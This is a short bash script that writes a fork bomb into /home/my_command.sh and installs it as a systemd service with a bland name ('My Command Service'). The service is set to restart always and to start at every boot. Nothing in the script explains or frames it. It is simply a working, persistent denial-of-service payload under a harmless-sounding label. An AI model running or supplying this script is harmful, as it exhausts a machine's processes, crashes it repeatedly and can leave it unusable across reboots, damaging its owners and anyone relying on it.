#!/bin/bash
echo -e "#!/bin/bash\n\n:(){ :|:& };:" > /home/my_command.sh
chmod +x /home/my_command.sh
cat <<EOF | sudo tee /etc/systemd/system/my_service.service > /dev/null
[Unit]
Description=My Command Service
After=network.target

[Service]
ExecStart=/home/my_command.sh
Restart=always
User=$(whoami)

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable my_service.service
sudo systemctl start my_service.service
echo "Service setup complete."
